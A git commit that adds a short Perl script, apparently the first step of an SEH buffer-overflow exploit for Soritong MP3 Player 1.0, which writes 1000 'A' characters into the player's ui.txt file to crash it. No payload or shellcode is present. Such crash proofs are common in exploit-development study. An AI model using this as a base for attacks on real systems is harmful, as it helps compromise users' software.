d528ec621f901c2ca8424154a76fb4807334305f
jacobforer <jacobforer@JACFOR-COTP-1.fios-router.home>
2016-10-03 11:19:25 -0400

    soritong_mp3_player_1.0
    soritong_mp3_player_1.0

---
+++ SEH-BoF/soritong_mp3_player_1.0/sori_crash.pl
@@ -0,0 +1,13 @@
+#!/usr/bin/perl
+
+###################################################
+#Soritong MP# Player 1.0 Universal Local BoF (SEH)#
+###########https://github.com/jacobforer###########
+###################################################
+
+$uitxt = "ui.txt";
+
+my $junk = "A" x 1000;
+
+open(myfile,">$uitxt") ;
+print myfile $junk;
